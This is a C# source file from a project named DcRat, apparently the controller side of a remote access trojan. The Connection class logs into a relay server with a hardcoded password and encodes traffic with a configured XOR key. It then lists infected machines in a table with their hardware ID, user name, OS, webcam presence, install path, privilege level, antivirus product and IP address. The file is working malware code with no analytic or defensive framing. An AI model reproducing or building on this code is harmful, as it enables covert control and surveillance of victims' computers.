using DcRat.Properties;
using MessagePack;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Timer = System.Threading.Timer;

namespace DcRat.TCPSocket
{
    class Connection
    {
        public static Socket TcpClient { get; set; } //Main socket
        private static byte[] Buffer { get; set; } //Socket buffer
        private static long HeaderSize { get; set; } //Recevied size
        private static long Offset { get; set; } // Buffer location
        private static Timer KeepAlive { get; set; } //Send Performance
        public static bool IsConnected { get; set; } //Check socket status
        private static object SendSync { get; } = new object(); //Sync send
        private static Timer Ping { get; set; } //Send ping interval
        public static int Interval { get; set; } //ping value
        public static bool ActivatePong { get; set; }

        public static List<MsgPack> Packs = new List<MsgPack>();

        public static void InitializeClient() //Connect & reconnect
        {
            try
            {

                TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 50 * 1024,
                    SendBufferSize = 50 * 1024,
                };

                TcpClient.Connect(Settings.Default.IP, Convert.ToInt32(Settings.Default.Port));

                if (TcpClient.Connected)
                {
                    IsConnected = true;
                    HeaderSize = 4;
                    Buffer = new byte[HeaderSize];
                    Offset = 0;
                    Send(SendInfo());
                    Interval = 0;
                    ActivatePong = false;
                    KeepAlive = new Timer(new TimerCallback(KeepAlivePacket), null, new Random().Next(10 * 1000, 15 * 1000), new Random().Next(10 * 1000, 15 * 1000));
                    Ping = new Timer(new TimerCallback(Pong), null, 1, 1);
                    TcpClient.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
                }
                else
                {
                    IsConnected = false;
                    return;
                }
            }
            catch
            {
                //Debug.WriteLine("Disconnected!");
                IsConnected = false;
                return;
            }
        }

        public static void Reconnect()
        {

            try
            {
                Ping?.Dispose();
                KeepAlive?.Dispose();
                TcpClient?.Dispose();
            }
            catch { }
            IsConnected = false;
        }

        public static void ReadServertData(IAsyncResult ar) //Socket read/recevie
        {
            try
            {
                if (!TcpClient.Connected || !IsConnected)
                {
                    IsConnected = false;
                    return;
                }
                int recevied = TcpClient.EndReceive(ar);
                if (recevied > 0)
                {
                    Offset += recevied;
                    HeaderSize -= recevied;
                    if (HeaderSize == 0)
                    {
                        HeaderSize = BitConverter.ToInt32(Buffer, 0);
                        //Debug.WriteLine("/// Client Buffersize " + HeaderSize.ToString() + " Bytes  ///");
                        if (HeaderSize > 0)
                        {
                            Offset = 0;
                            Buffer = new byte[HeaderSize];
                            while (HeaderSize > 0)
                            {
                                int rc = TcpClient.Receive(Buffer, 0, Buffer.Length, SocketFlags.None);
                                if (rc <= 0)
                                {
                                    IsConnected = false;
                                    return;
                                }
                                Offset += rc;
                                HeaderSize -= rc;
                                if (HeaderSize < 0)
                                {
                                    IsConnected = false;
                                    return;
                                }
                            }

                            Thread thread = new Thread(new ParameterizedThreadStart(Read));
                            thread.Start(Buffer);
                            Offset = 0;
                            HeaderSize = 4;
                            Buffer = new byte[HeaderSize];
                        }
                        else
                        {
                            HeaderSize = 4;
                            Buffer = new byte[HeaderSize];
                            Offset = 0;
                        }
                    }
                    else if (HeaderSize < 0)
                    {
                        IsConnected = false;
                        return;
                    }
                    TcpClient.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
                }
                else
                {
                    IsConnected = false;
                    return;
                }
            }
            catch
            {
                IsConnected = false;
                return;
            }
        }

        public static void Send(byte[] msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!IsConnected)
                    {
                        return;
                    }

                    byte[] buffer = Xor((byte[])msg);
                    byte[] buffersize = BitConverter.GetBytes(buffer.Length);

                    TcpClient.Poll(-1, SelectMode.SelectWrite);
                    TcpClient.Send(buffersize, 0, buffersize.Length, SocketFlags.None);
                    TcpClient.Send(buffer, 0, buffer.Length, SocketFlags.None);
                }
                catch
                {
                    IsConnected = false;
                    return;
                }
            }
        }

        public static void KeepAlivePacket(object obj)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "Ping";
                Send(msgpack.Encode2Bytes());
                GC.Collect();
                ActivatePong = true;
            }
            catch { }
        }

        private static void Pong(object obj)
        {
            try
            {
                if (ActivatePong && IsConnected)
                {
                    Interval++;
                }
            }
            catch { }
        }


        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes(Xor((byte[])data));
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "Pong": //send interval value to server
                        {
                            ActivatePong = false;
                            MsgPack msgPack = new MsgPack();
                            msgPack.ForcePathObject("Packet").SetAsString("Pong");
                            msgPack.ForcePathObject("Message").SetAsInteger(Interval);
                            Send(msgPack.Encode2Bytes());
                            Interval = 0;
                            break;
                        }

                    case "ClientInfo":
                        {
                            Clients client = new Clients();
                            client.Info.HWID = unpack_msgpack.ForcePathObject("HWID").AsString;
                            client.Info.User = unpack_msgpack.ForcePathObject("User").AsString;
                            client.Info.OS = unpack_msgpack.ForcePathObject("OS").AsString;
                            client.Info.Camera = Convert.ToBoolean(unpack_msgpack.ForcePathObject("Camera").AsString);
                            client.Info.InstallType = unpack_msgpack.ForcePathObject("Install-Type").GetAsInteger();
                            client.Info.InstallTime = unpack_msgpack.ForcePathObject("Install-Time").AsString;
                            client.Info.Path = unpack_msgpack.ForcePathObject("Path").AsString;
                            client.Info.Version = unpack_msgpack.ForcePathObject("Version").AsString;
                            client.Info.Permission = unpack_msgpack.ForcePathObject("Permission").GetAsInteger();
                            client.Info.AV = unpack_msgpack.ForcePathObject("AV").AsString;
                            client.Info.Group = unpack_msgpack.ForcePathObject("Group").AsString;
                            client.Info.Active = unpack_msgpack.ForcePathObject("Active").AsString;
                            client.Info.IP = unpack_msgpack.ForcePathObject("IP").AsString;

                            client.LV = new ListViewItem
                            {
                                Tag = client,
                                Text = client.Info.IP,
                            };
                            client.LV.SubItems.Add("unknown");
                            client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Group").AsString);
                            client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
                            client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
                            client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
                            client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Camera").AsString);
                            client.LV.SubItems.Add("To Add");
                            client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("AV").AsString);
                            client.LV.SubItems.Add("0ms");
                            client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Active").AsString);
                            FormMain.childForm_Home.Invoke((MethodInvoker)(() =>
                            {
                                lock (Setting.LockListviewClients)
                                {
                                    FormMain.childForm_Home.listViewHome.Items.Add(client.LV);
                                    FormMain.childForm_Home.listViewHome.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                                }
                            }));


                            break;
                        }
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        public static byte[] SendInfo()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Controler";
            msgpack.ForcePathObject("Type").AsString = "Connect";
            msgpack.ForcePathObject("Password").AsString = "qwqdanchun";
            msgpack.ForcePathObject("HWID").AsString = HWID();
            return msgpack.Encode2Bytes();
        }

        public static void Error(string ex) //send to logs
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Send(msgpack.Encode2Bytes());
        }


        #region HWID
        public static string HWID()
        {
            try
            {
                string strToHash = string.Concat(Environment.ProcessorCount, Environment.UserName,
                    Environment.MachineName, Environment.OSVersion
                    , new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize);
                MD5CryptoServiceProvider md5Obj = new MD5CryptoServiceProvider();
                byte[] bytesToHash = Encoding.ASCII.GetBytes(strToHash);
                bytesToHash = md5Obj.ComputeHash(bytesToHash);
                StringBuilder strResult = new StringBuilder();
                foreach (byte b in bytesToHash)
                    strResult.Append(b.ToString("x2"));
                return strResult.ToString().Substring(0, 20).ToUpper();
            }
            catch
            {
                return "Err HWID";
            }
        }
        #endregion


        static byte[] Xor(byte[] buffer)
        {
            char[] key = Settings.Default.XorKey.ToCharArray();
            byte[] newByte = new byte[buffer.Length];

            int j = 0;

            for (int i = 0; i < buffer.Length; i++)
            {
                if (j == key.Length)
                {
                    j = 0;
                }
                newByte[i] = (byte)(buffer[i] ^ Convert.ToByte(key[j]));
                j++;
            }
            return newByte;
        }

    }
}
